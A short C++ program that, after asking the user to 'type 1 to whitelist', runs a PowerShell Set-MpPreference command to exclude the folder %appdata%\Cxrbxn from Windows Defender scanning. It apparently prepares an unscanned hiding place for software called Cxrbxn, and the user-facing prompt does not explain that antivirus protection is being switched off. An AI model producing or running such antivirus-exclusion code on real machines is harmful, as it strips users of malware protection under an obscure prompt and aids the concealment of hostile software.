#include <iostream>
using namespace std;

int main() {
    int input;
    std::cout << "Would you like to Cxrbxn? (Type 1 to whitelist.)\n";
    std::cout << "Number: ";
    std::cin >> input;

    if (input == 1) {
        system("powershell.exe Set-MpPreference -ExclusionPath %appdata%\\Cxrbxn");
        std::cout << "Added Cxrbxn to the whitelist.\n";
        system("pause");
    }
    return 0;
}